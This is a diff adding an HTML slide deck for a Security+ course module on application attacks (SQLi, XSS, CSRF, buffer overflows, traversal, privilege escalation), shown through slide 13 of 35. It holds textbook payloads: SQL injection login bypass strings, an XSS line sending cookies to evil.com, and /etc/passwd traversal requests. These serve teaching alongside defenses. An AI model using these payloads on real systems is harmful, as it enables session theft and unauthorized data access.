@@ -1,0 +1,1260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- Access Control -->
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('sorted');</script>
+    <!-- Progress & Achievements -->
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <!-- FirebaseAuth: required for tenant progress sync -->
+    <script src="../../../../components/FirebaseAuth.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Application Attacks | Principles of Information Security</title>
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { height: 100%; overflow: hidden; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #020814 0%, #030d1a 50%, #040f1e 100%);
+            color: #e2e8f0; font-size: 15px; line-height: 1.5;
+        }
+
+        .slide {
+            display: none; position: fixed; inset: 0;
+            padding: 20px 28px 72px; overflow: hidden;
+            animation: slideIn 0.35s ease-out;
+        }
+        .slide.active {
+            display: flex; flex-direction: column;
+            align-items: center; justify-content: center;
+        }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(16px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+        .slide-inner {
+            width: 100%; max-width: 1100px;
+            display: flex; flex-direction: column; gap: 14px;
+        }
+
+        #progress-bar {
+            position: fixed; top: 0; left: 0; height: 3px;
+            background: #3b82f6; transition: width 0.4s ease; z-index: 200;
+        }
+
+        #nav-bar {
+            position: fixed; bottom: 0; left: 0; right: 0; height: 58px;
+            background: rgba(2, 8, 20, 0.95);
+            border-top: 1px solid rgba(59, 130, 246, 0.1);
+            display: flex; align-items: center; justify-content: center;
+            gap: 14px; z-index: 200; padding: 0 20px;
+        }
+        .nav-btn {
+            background: rgba(255, 255, 255, 0.05); color: #94a3b8;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 8px 22px; border-radius: 6px; font-size: 0.88rem;
+            cursor: pointer; transition: background 0.2s, color 0.2s;
+        }
+        .nav-btn:hover:not(:disabled) {
+            background: rgba(59, 130, 246, 0.12); color: #3b82f6; border-color: #3b82f6;
+        }
+        .nav-btn:disabled { opacity: 0.3; cursor: not-allowed; }
+        .nav-btn.back-btn { font-size: 0.82rem; padding: 8px 16px; }
+        #slide-counter { color: #64748b; font-size: 0.82rem; min-width: 90px; text-align: center; }
+
+        #complete-btn {
+            display: none; background: #3b82f6; color: #fff; border: none;
+            padding: 9px 26px; border-radius: 6px; font-size: 0.9rem;
+            font-weight: 700; cursor: pointer; transition: background 0.2s, transform 0.15s;
+        }
+        #complete-btn:hover { background: #60a5fa; transform: translateY(-1px); }
+
+        .slide-meta { font-size: 0.78rem; color: #3b82f6; letter-spacing: 0.08em; text-transform: uppercase; text-align: center; }
+        .slide-title { font-size: 1.75rem; font-weight: 700; color: #f1f5f9; text-align: center; line-height: 1.25; }
+        .slide-title .accent { color: #3b82f6; }
+        .slide-subtitle { font-size: 0.95rem; color: #94a3b8; text-align: center; }
+
+        .scenario-strip {
+            background: rgba(59, 130, 246, 0.06); border-left: 3px solid #3b82f6;
+            border-radius: 0 8px 8px 0; padding: 10px 16px;
+            font-size: 0.88rem; color: #bfdbfe; font-style: italic;
+        }
+
+        .box { border-radius: 8px; padding: 12px 16px; font-size: 0.875rem; }
+        .box-blue  { background: rgba(59, 130, 246, 0.08); border: 1px solid rgba(59, 130, 246, 0.3); color: #bfdbfe; }
+        .box-cyan  { background: rgba(6, 182, 212, 0.08); border: 1px solid rgba(6, 182, 212, 0.3); color: #cffafe; }
+        .box-green { background: rgba(34, 197, 94, 0.08); border: 1px solid rgba(34, 197, 94, 0.3); color: #bbf7d0; }
+        .box-red   { background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.3); color: #fee2e2; }
+        .box-gold  { background: rgba(234, 179, 8, 0.08); border: 1px solid rgba(234, 179, 8, 0.3); color: #fef9c3; }
+        .box-label { font-size: 0.72rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 5px; opacity: 0.75; }
+
+        .title-hero { text-align: center; display: flex; flex-direction: column; align-items: center; gap: 10px; }
+        .title-hero .big-title { font-size: 2.4rem; font-weight: 800; color: #f1f5f9; line-height: 1.2; }
+        .title-hero .big-title .accent { color: #3b82f6; }
+        .title-meta-row {
+            display: flex; gap: 28px; justify-content: center; margin-top: 6px;
+            font-size: 0.82rem; color: #475569;
+        }
+        .title-meta-row span { border-left: 2px solid #1e293b; padding-left: 28px; }
+        .title-meta-row span:first-child { border-left: none; padding-left: 0; }
+
+        .card-grid   { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+        .card-grid-2 { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+        .card {
+            background: rgba(255, 255, 255, 0.03); border-radius: 8px;
+            padding: 12px 14px; border-left: 3px solid #3b82f6;
+        }
+        .card:hover { background: rgba(255, 255, 255, 0.06); }
+        .card .card-label { font-size: 0.95rem; font-weight: 700; color: #f1f5f9; margin-bottom: 4px; }
+        .card .card-desc  { font-size: 0.82rem; color: #94a3b8; line-height: 1.4; }
+        .card.c-blue  { border-left-color: #3b82f6; }
+        .card.c-red   { border-left-color: #ef4444; }
+        .card.c-gold  { border-left-color: #eab308; }
+        .card.c-cyan  { border-left-color: #06b6d4; }
+        .card.c-green { border-left-color: #22c55e; }
+        .card.c-purple { border-left-color: #a855f7; }
+
+        .section-label { font-size: 0.72rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.09em; color: #475569; }
+        .divider { border: none; border-top: 1px solid rgba(255, 255, 255, 0.07); }
+
+        .summary-facts { display: flex; flex-direction: column; gap: 6px; }
+        .fact-row { display: flex; gap: 12px; align-items: baseline; font-size: 0.875rem; }
+        .fact-num  { font-size: 0.78rem; font-weight: 700; color: #3b82f6; min-width: 22px; text-align: right; flex-shrink: 0; }
+        .fact-text { color: #cbd5e1; }
+        .fact-text code {
+            font-family: 'Courier New', monospace; color: #3b82f6;
+            background: rgba(59, 130, 246, 0.08); padding: 1px 5px;
+            border-radius: 3px; font-size: 0.85em;
+        }
+
+        .code-block {
+            background: rgba(0, 0, 0, 0.55); border: 1px solid rgba(59, 130, 246, 0.12);
+            border-radius: 6px; padding: 10px 14px;
+            font-family: 'Courier New', monospace; font-size: 0.82rem;
+            color: #e2e8f0; line-height: 1.6; white-space: pre;
+        }
+        .code-block .kw { color: #3b82f6; }
+        .code-block .fn { color: #06b6d4; }
+        .code-block .st { color: #22c55e; }
+        .code-block .cm { color: #475569; }
+        .code-block .nb { color: #f472b6; }
+        .code-block .er { color: #ef4444; }
+
+        .ic {
+            font-family: 'Courier New', monospace; color: #3b82f6;
+            background: rgba(59, 130, 246, 0.08); padding: 1px 5px;
+            border-radius: 3px; font-size: 0.85em;
+        }
+
+        @media (max-height: 700px) { .slide-inner { gap: 9px; } .slide-title { font-size: 1.4rem; } .title-hero .big-title { font-size: 1.9rem; } }
+        @media (max-width: 768px)  { .card-grid { grid-template-columns: 1fr; } .card-grid-2 { grid-template-columns: 1fr; } .slide-title { font-size: 1.3rem; } }
+    </style>
+</head>
+<body>
+<h1 style="position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0;">Application Attacks | Principles of Information Security</h1>
+
+<div id="progress-bar" style="width:2.86%"></div>
+
+<!-- ==================== SLIDE 1 -- TITLE ==================== -->
+<section class="slide active" id="slide-1">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 1 of 35 &nbsp;|&nbsp; PIS-05 &nbsp;|&nbsp; Week 2 of 8 &nbsp;|&nbsp; SY0-701: 2.3, 2.4</div>
+        <div class="title-hero">
+            <div class="big-title">
+                Application<br>
+                <span class="accent">Attacks</span>
+            </div>
+            <div class="slide-subtitle" style="font-size:1.05rem; margin-top:6px;">
+                SQLi &nbsp;&bull;&nbsp; XSS &nbsp;&bull;&nbsp; CSRF &nbsp;&bull;&nbsp; Buffer Overflow &nbsp;&bull;&nbsp; Traversal &nbsp;&bull;&nbsp; Privilege Escalation
+            </div>
+        </div>
+        <div class="scenario-strip">
+            Containment Protocol Delta. A routine specimen database query returned the full contents of the facility's personnel roster. The query was submitted through the research portal intake form. No credentials were used. No firewall rule was violated. The application itself became the attack vector.
+        </div>
+        <div class="title-meta-row">
+            <span>35 Slides</span>
+            <span>PIS-05</span>
+            <span>Week 2 of 8</span>
+            <span>CompTIA SY0-701</span>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 2 -- APPLICATION ATTACK SURFACE ==================== -->
+<section class="slide" id="slide-2">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 2 of 35</div>
+        <div class="slide-title">The <span class="accent">Application Attack Surface</span></div>
+        <div class="slide-subtitle">Applications process untrusted input. Every input field, URL parameter, and API endpoint is a potential entry point.</div>
+
+        <div class="card-grid">
+            <div class="card c-red">
+                <div class="card-label">Input Is Never Trusted</div>
+                <div class="card-desc">Every byte that enters an application from the outside world -- form fields, URL parameters, HTTP headers, cookies, uploaded files -- must be treated as hostile until validated. The attacker controls the input. The developer controls the validation. Only one of them is disciplined about it.</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">Application vs. Network Layer</div>
+                <div class="card-desc">Network firewalls operate at layers 3 and 4. Application attacks occur at layer 7. A firewall allows HTTPS traffic to a web server by design -- it cannot distinguish a legitimate POST from a SQL injection payload hidden in that POST. Application-layer controls are required.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">OWASP Top 10</div>
+                <div class="card-desc">The Open Web Application Security Project publishes the most critical web application risks. Injection, broken authentication, XSS, and insecure design consistently appear. SY0-701 draws heavily from OWASP categories. Every vulnerability in this module maps to that list.</div>
+            </div>
+        </div>
+
+        <div class="box box-blue">
+            <div class="box-label">Why Applications Are Hard to Secure</div>
+            Applications are written by humans under deadline pressure, using frameworks with their own vulnerabilities, consuming libraries with undisclosed CVEs, connecting to databases with over-permissioned service accounts. Security is not the default state -- it must be explicitly engineered in.
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 3 -- SQL INJECTION OVERVIEW ==================== -->
+<section class="slide" id="slide-3">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 3 of 35</div>
+        <div class="slide-title">SQL Injection <span class="accent">Overview</span></div>
+        <div class="slide-subtitle">The attacker inserts SQL syntax into an input field, altering the query the database executes. Consistently in OWASP Top 3.</div>
+
+        <div class="scenario-strip">
+            Facility intake portal authenticates researchers: SELECT * FROM users WHERE username='[input]' AND password='[input]'. Researcher ID R-999 enters username: <span style="color:#ef4444; font-family: monospace;">admin'--</span>. The double-dash comments out the password check. The query becomes: SELECT * FROM users WHERE username='admin'. Authentication bypassed. Full admin session granted.
+        </div>
+
+        <div class="card-grid-2">
+            <div class="card c-red">
+                <div class="card-label">Classic SQLi</div>
+                <div class="card-desc">Input appended directly into a SQL string. The payload closes the original query context using quotes or comment sequences, then injects arbitrary SQL. Results are returned directly in the HTTP response, making data exfiltration immediate and visible to the attacker.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Error-Based SQLi</div>
+                <div class="card-desc">Database error messages reveal schema details. An attacker intentionally triggers errors by injecting syntax that produces verbose output. MySQL, MSSQL, and Oracle all produce distinct error formats that reveal table names, column names, and query structure when not properly suppressed.</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">Blind SQLi</div>
+                <div class="card-desc">No data is returned directly. The attacker infers information from binary true/false responses or timing. Boolean-based: ask yes/no questions ("is the first character of the admin password greater than M?"). Time-based: use SLEEP() to confirm query execution by measuring response delay.</div>
+            </div>
+            <div class="card c-cyan">
+                <div class="card-label">Out-of-Band SQLi</div>
+                <div class="card-desc">Data is exfiltrated through a secondary channel such as DNS lookups or HTTP requests triggered by the database server. Used when in-band and blind techniques are blocked. Requires the database server to have outbound network connectivity -- tightly restricted in hardened environments.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 4 -- SQL INJECTION MECHANICS ==================== -->
+<section class="slide" id="slide-4">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 4 of 35</div>
+        <div class="slide-title">SQL Injection <span class="accent">Mechanics and Defense</span></div>
+        <div class="slide-subtitle">Understanding the attack at code level is required to understand why the defenses work.</div>
+
+        <div class="code-block"><span class="cm">-- Vulnerable query: string concatenation</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> specimens <span class="kw">WHERE</span> id = <span class="st">'</span> + userInput + <span class="st">'</span>
+
+<span class="cm">-- Attacker input: 1' OR '1'='1</span>
+<span class="cm">-- Resulting query: returns ALL rows</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> specimens <span class="kw">WHERE</span> id = <span class="st">'1' OR '1'='1'</span>
+
+<span class="cm">-- Parameterized query: the fix</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> specimens <span class="kw">WHERE</span> id = <span class="nb">?</span>
+<span class="cm">-- Input is treated as data, never as SQL syntax</span></div>
+
+        <div class="card-grid">
+            <div class="card c-green">
+                <div class="card-label">Parameterized Queries</div>
+                <div class="card-desc">The most effective SQLi defense. The query structure is compiled separately from the input. User data cannot alter the query's logical structure because it is bound as a typed parameter, not concatenated as a string. Supported by every modern database library.</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">Stored Procedures</div>
+                <div class="card-desc">Pre-compiled queries in the database. When properly implemented (without dynamic SQL inside), they provide the same protection as parameterized queries. The application calls the procedure by name; the database executes a fixed query with bound parameters.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Least Privilege on DB Account</div>
+                <div class="card-desc">Even if SQLi succeeds, the damage is limited by the database account's permissions. A read-only account cannot DROP TABLE. A schema-restricted account cannot query the system catalog for other table names. Defense in depth applies at the database layer too.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 5 -- XSS OVERVIEW ==================== -->
+<section class="slide" id="slide-5">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 5 of 35</div>
+        <div class="slide-title">Cross-Site Scripting <span class="accent">(XSS)</span></div>
+        <div class="slide-subtitle">The attacker injects malicious scripts into content that is then rendered by the victim's browser. Three distinct types.</div>
+
+        <div class="card-grid">
+            <div class="card c-red">
+                <div class="card-label">Stored XSS (Persistent)</div>
+                <div class="card-desc">Malicious script is saved to the server's database and served to every user who views that content. A forum post containing a script tag executes in the browser of every subsequent visitor. The attacker does not need to target individual users -- the server delivers the payload for them.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Reflected XSS (Non-Persistent)</div>
+                <div class="card-desc">The payload is in the URL or request, and the server reflects it back in the response without storage. Requires the victim to click a crafted link. The URL contains the script; the server echoes input into the page without sanitization. Common in search results and error messages.</div>
+            </div>
+            <div class="card c-purple">
+                <div class="card-label">DOM-Based XSS</div>
+                <div class="card-desc">The payload never reaches the server. Client-side JavaScript reads from an attacker-controlled source (URL fragment, localStorage) and writes it to the DOM without sanitization. Invisible to server-side input validation -- the attack is entirely in the browser's document model. Hardest to detect with WAFs.</div>
+            </div>
+        </div>
+
+        <div class="box box-red">
+            <div class="box-label">What XSS Actually Does</div>
+            A script executing in the victim's browser has access to: session cookies (unless HttpOnly), saved form data, page content, keystrokes, and the ability to make authenticated requests on the user's behalf. Session hijacking via XSS is trivially simple when HttpOnly is not set on session cookies.
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 6 -- XSS MECHANICS ==================== -->
+<section class="slide" id="slide-6">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 6 of 35</div>
+        <div class="slide-title">XSS <span class="accent">Mechanics and Defense</span></div>
+        <div class="slide-subtitle">The attack exploits the browser's trust in content served from a legitimate origin.</div>
+
+        <div class="code-block"><span class="cm">-- Stored XSS: attacker submits this as a comment</span>
+<span class="er">&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie;&lt;/script&gt;</span>
+
+<span class="cm">-- DOM XSS: vulnerable client-side code</span>
+<span class="kw">const</span> name = location.hash.substring(1);  <span class="cm">// reads #payload from URL</span>
+document.getElementById(<span class="st">'greeting'</span>).innerHTML = <span class="st">'Hello, '</span> + name;  <span class="er">// unsafe</span>
+
+<span class="cm">-- Fix: use textContent, not innerHTML</span>
+document.getElementById(<span class="st">'greeting'</span>).textContent = <span class="st">'Hello, '</span> + name;</div>
+
+        <div class="card-grid">
+            <div class="card c-green">
+                <div class="card-label">Output Encoding</div>
+                <div class="card-desc">Encode all user-controlled data before inserting it into HTML, JavaScript, CSS, or URL contexts. In HTML context: &amp;lt; &amp;gt; &amp;amp; &amp;quot; &amp;#x27;. Each output context requires its own encoding scheme. A single encoding function for all contexts is incorrect and dangerous.</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">Content Security Policy (CSP)</div>
+                <div class="card-desc">HTTP response header that specifies which script sources the browser should trust. A strict CSP blocks inline scripts and scripts from untrusted origins. Even if XSS payload injection succeeds, CSP prevents execution. Requires careful tuning -- overly permissive CSP provides no protection.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">HttpOnly and SameSite Cookies</div>
+                <div class="card-desc">HttpOnly prevents JavaScript from reading the cookie -- session theft via document.cookie is blocked even if XSS fires. SameSite=Strict prevents the cookie from being sent on cross-site requests, mitigating CSRF. Both flags should be set on every session cookie.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 7 -- CSRF ==================== -->
+<section class="slide" id="slide-7">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 7 of 35</div>
+        <div class="slide-title">Cross-Site Request Forgery <span class="accent">(CSRF)</span></div>
+        <div class="slide-subtitle">The attacker tricks a victim's authenticated browser into submitting a request to a trusted site without the victim's knowledge.</div>
+
+        <div class="scenario-strip">
+            Researcher R-44 is logged into the facility portal. The attacker sends R-44 a link to an external page containing a hidden form. When R-44 visits, the page auto-submits a POST to the facility portal: "Transfer specimen 7-Bravo to External Lab 4." The portal processes it because the request carries R-44's valid session cookie. The researcher never clicked anything.
+        </div>
+
+        <div class="card-grid-2">
+            <div class="card c-red">
+                <div class="card-label">How CSRF Works</div>
+                <div class="card-desc">Browsers automatically attach cookies to every request for a domain -- including cross-origin requests triggered by attacker-controlled pages. The server sees a request with valid credentials and processes it. The server cannot distinguish an intentional request from a forged one without additional verification.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">What CSRF Can Accomplish</div>
+                <div class="card-desc">Any state-changing action the victim can perform: password change, email change, funds transfer, data deletion, admin action, permission escalation. Read-only requests are not exploitable -- CSRF forges actions, not data retrieval (the response is not accessible cross-origin due to SOP).</div>
+            </div>
+            <div class="card c-green">
+                <div class="card-label">CSRF Tokens</div>
+                <div class="card-desc">Server generates a unique, secret, unpredictable token per session. Every state-changing form includes the token as a hidden field. Server validates the token on submission. Attacker cannot forge the token because they cannot read the victim's page content (same-origin policy blocks it).</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">SameSite Cookie Attribute</div>
+                <div class="card-desc">SameSite=Strict: browser never sends cookie on cross-site requests -- CSRF is impossible. SameSite=Lax: cookie sent on top-level navigations but not on background requests. SameSite=None: legacy behavior, requires Secure flag. SameSite=Strict is the strongest CSRF defense at the cookie level.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 8 -- CSRF VS XSS ==================== -->
+<section class="slide" id="slide-8">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 8 of 35</div>
+        <div class="slide-title">CSRF vs. XSS <span class="accent">Comparison</span></div>
+        <div class="slide-subtitle">Two injection-adjacent attacks with different mechanics, different trust relationships, and different defenses.</div>
+
+        <div class="card-grid-2">
+            <div class="card c-red">
+                <div class="card-label">XSS -- Script Execution</div>
+                <div class="card-desc">Attacker injects code that runs in the victim's browser in the context of a trusted origin. The browser trusts the injected script as if it came from the legitimate site. XSS exploits the user's trust in the website's content. The attack is FROM the target site TO the user.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">CSRF -- Forged Requests</div>
+                <div class="card-desc">Attacker tricks the victim's browser into sending a request to a trusted site. No script injection required. CSRF exploits the server's trust in the authenticated user's browser. The attack is FROM a third-party site TO the target server, using the victim as an unwitting relay.</div>
+            </div>
+        </div>
+
+        <div class="box box-blue">
+            <div class="box-label">Combined Attack: XSS Bypasses CSRF Tokens</div>
+            If XSS exists on a site that uses CSRF tokens, the XSS payload can read the CSRF token from the DOM and include it in a forged request. XSS effectively breaks CSRF defenses. This is why XSS is considered more severe -- it undermines multiple independent defenses simultaneously.
+        </div>
+
+        <div class="box box-gold">
+            <div class="box-label">SY0-701 Exam Distinction</div>
+            XSS: attacker injects script, browser executes it. CSRF: attacker forges request, server processes it. The exam will present a scenario and ask which attack it describes. Key signal: if a script executes in the victim's browser, it is XSS. If a request is forged to a trusted server, it is CSRF.
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 9 -- BUFFER OVERFLOW OVERVIEW ==================== -->
+<section class="slide" id="slide-9">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 9 of 35</div>
+        <div class="slide-title">Buffer Overflow <span class="accent">Overview</span></div>
+        <div class="slide-subtitle">Writing more data into a buffer than it was allocated to hold, overwriting adjacent memory with attacker-controlled content.</div>
+
+        <div class="scenario-strip">
+            The facility's legacy C-based specimen tracking daemon allocates a 256-byte buffer for incoming specimen IDs. An attacker sends a 512-byte payload. The extra 256 bytes overwrite the function's return address on the stack. When the function returns, execution jumps to the attacker's shellcode instead of the calling function. Root shell obtained. No authentication required.
+        </div>
+
+        <div class="card-grid">
+            <div class="card c-red">
+                <div class="card-label">Stack Buffer Overflow</div>
+                <div class="card-desc">The most common variant. Data is written beyond the end of a stack-allocated buffer, overwriting the saved return address. The attacker controls where the function returns -- typically to injected shellcode or to existing executable code (return-oriented programming). Exploits are highly reliable against unprotected binaries.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Heap Buffer Overflow</div>
+                <div class="card-desc">Overflow occurs in heap-allocated memory. More complex to exploit than stack overflows because heap layouts are less predictable. Attacker overwrites heap metadata, function pointers, or adjacent objects. Browser exploits frequently use heap overflows because browsers heap-allocate most objects.</div>
+            </div>
+            <div class="card c-purple">
+                <div class="card-label">Integer Overflow</div>
+                <div class="card-desc">An integer variable wraps around its maximum value. A length variable calculated as unsigned short can wrap from 65535 to 0, causing a zero-length buffer to be allocated, which is then immediately overflowed by the actual data. Integer overflows often precede and enable buffer overflows in secure code.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 10 -- BUFFER OVERFLOW DEFENSES ==================== -->
+<section class="slide" id="slide-10">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 10 of 35</div>
+        <div class="slide-title">Buffer Overflow <span class="accent">Defenses</span></div>
+        <div class="slide-subtitle">Modern operating systems implement multiple complementary mitigations. Each can be bypassed individually; together they raise the cost significantly.</div>
+
+        <div class="card-grid-2">
+            <div class="card c-green">
+                <div class="card-label">ASLR -- Address Space Layout Randomization</div>
+                <div class="card-desc">The OS randomizes the base addresses of the stack, heap, and libraries on each execution. An attacker cannot hardcode the address of their shellcode because its location changes each run. Bypassed through info leaks that disclose memory addresses or by brute-forcing (32-bit entropy is manageable; 64-bit is not).</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">DEP/NX -- Data Execution Prevention</div>
+                <div class="card-desc">Memory pages are marked either writable or executable, but not both. The attacker can write shellcode to the stack, but the CPU refuses to execute it. Bypassed by return-oriented programming (ROP), which chains small executable snippets already present in memory without injecting new code.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Stack Canaries</div>
+                <div class="card-desc">A random sentinel value is placed between the local variables and the saved return address. Before returning, the function checks that the canary is intact. If it was overwritten, the program terminates. Bypassed by info leaks that disclose the canary value before the overflow, then reproduce it in the payload.</div>
+            </div>
+            <div class="card c-cyan">
+                <div class="card-label">Safe Languages and Bounds Checking</div>
+                <div class="card-desc">Memory-safe languages (Rust, Java, Go, Python) perform automatic bounds checking on array accesses and prevent direct pointer manipulation. Buffer overflows are essentially impossible in these languages by design. New systems code is increasingly written in Rust for this reason. Legacy C/C++ code remains vulnerable.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 11 -- DIRECTORY TRAVERSAL ==================== -->
+<section class="slide" id="slide-11">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 11 of 35</div>
+        <div class="slide-title">Directory <span class="accent">Traversal</span></div>
+        <div class="slide-subtitle">The attacker manipulates file path parameters to access files outside the intended directory tree.</div>
+
+        <div class="code-block"><span class="cm">-- Application intends to serve: /var/www/specimens/[filename]</span>
+<span class="cm">-- Attacker-controlled request:</span>
+GET /view?file=<span class="er">../../../etc/passwd</span>
+
+<span class="cm">-- Resolved path:</span>
+/var/www/specimens/<span class="er">../../../etc/passwd</span>  =  /etc/passwd
+
+<span class="cm">-- URL-encoded variant (bypasses naive filters):</span>
+GET /view?file=<span class="er">..%2F..%2F..%2Fetc%2Fpasswd</span>
+
+<span class="cm">-- Double-encoded variant:</span>
+GET /view?file=<span class="er">..%252F..%252F..%252Fetc%252Fpasswd</span></div>
+
+        <div class="card-grid">
+            <div class="card c-red">
+                <div class="card-label">What Gets Exposed</div>
+                <div class="card-desc">Configuration files with credentials, private keys, password hashes, application source code, user home directories, system configuration, database connection strings. On Windows, traversal to C:\Windows\win.ini or C:\inetpub\wwwroot\web.config. Any file readable by the web server process is accessible.</div>
+            </div>
+            <div class="card c-green">
+                <div class="card-label">Defense: Path Canonicalization</div>
+                <div class="card-desc">Resolve the full canonical path of the requested file before any access check. After canonicalization, verify the path starts with the allowed base directory. Using Java's File.getCanonicalPath() or Python's os.path.realpath() and then checking startswith() is the correct pattern.</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">Defense: Chroot and Containerization</div>
+                <div class="card-desc">Restrict the web server process to a directory subtree using chroot jail or container namespaces. Even if traversal succeeds, the process cannot access files outside its root. The jail limits the blast radius -- /etc/passwd inside the jail is not the real system's passwd file.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 12 -- PRIVILEGE ESCALATION OVERVIEW ==================== -->
+<section class="slide" id="slide-12">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 12 of 35</div>
+        <div class="slide-title">Privilege <span class="accent">Escalation</span></div>
+        <div class="slide-subtitle">Gaining access rights beyond what was originally granted. The step that converts a foothold into full compromise.</div>
+
+        <div class="card-grid-2">
+            <div class="card c-red">
+                <div class="card-label">Vertical Escalation</div>
+                <div class="card-desc">A lower-privileged user gains higher-privileged access -- standard user to local admin, local admin to domain admin, user to root. This is what most people picture when they hear "privilege escalation." The goal is to reach a level that allows unrestricted access to the system or network.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Horizontal Escalation</div>
+                <div class="card-desc">A user accesses another user's resources at the same privilege level. User A accesses User B's files, emails, or account without authorization. Often achieved by manipulating object references (IDOR -- Insecure Direct Object Reference) in application URLs or API calls. Same privilege level, wrong identity.</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">Local Privilege Escalation</div>
+                <div class="card-desc">Attacker has local code execution (not root) and exploits an OS vulnerability, misconfigured SUID binary, weak file permissions, unquoted service paths, or writable PATH entries to elevate to root or SYSTEM. Common post-exploitation step after initial access via a phish or web shell.</div>
+            </div>
+            <div class="card c-cyan">
+                <div class="card-label">Application Privilege Escalation</div>
+                <div class="card-desc">Within an application, a standard user accesses admin functionality by manipulating request parameters. Changing ?role=user to ?role=admin in a request, forging a JWT with an elevated role claim, or accessing /admin/ endpoints that lack authorization checks. The application fails to enforce its own access controls.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 13 -- PRIVILEGE ESCALATION TECHNIQUES ==================== -->
+<section class="slide" id="slide-13">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 13 of 35</div>
+        <div class="slide-title">Privilege Escalation <span class="accent">Techniques</span></div>
+        <div class="slide-subtitle">Specific vectors used in real environments. Each maps to a specific misconfiguration or vulnerability class.</div>
+
+        <div class="card-grid">
+            <div class="card c-red">
+                <div class="card-label">SUID/SGID Binary Abuse</div>
+                <div class="card-desc">On Linux, SUID binaries run as the file owner (often root) regardless of who executes them. If a custom binary has SUID root set and can be manipulated (via injection, path manipulation, or symlink attack), any user can run code as root. GTFOBins catalogs SUID binaries with known escalation techniques.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Kernel Exploits</div>
+                <div class="card-desc">Unpatched kernel vulnerabilities allow unprivileged processes to escalate to ring 0. Dirty Cow (CVE-2016-5195), Dirty Pipe (CVE-2022-0847), and PwnKit (CVE-2021-4034) are recent examples. Kernel exploits are highly reliable but require a matching kernel version. Kernel patching eliminates them.</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">Token Impersonation (Windows)</div>
+                <div class="card-desc">Windows access tokens represent the security context of a process. An attacker with SeImpersonatePrivilege (commonly held by service accounts) can impersonate any token -- including SYSTEM. Potato exploits (Hot Potato, Juicy Potato, PrintSpoofer) use this technique to escalate from service accounts to SYSTEM.</div>
+            </div>
+        </div>
+
+        <div class="box box-blue">
+            <div class="box-label">Defense: Least Privilege + Patching</div>
+            Most privilege escalation requires either a vulnerability (patch it) or a misconfiguration (harden it). Regular patching eliminates kernel exploits. Removing unnecessary SUID bits eliminates SUID abuse. Restricting dangerous Windows privileges eliminates token impersonation. These are operational discipline, not exotic security tooling.
+        </div>
+    </div>
+</section>
+
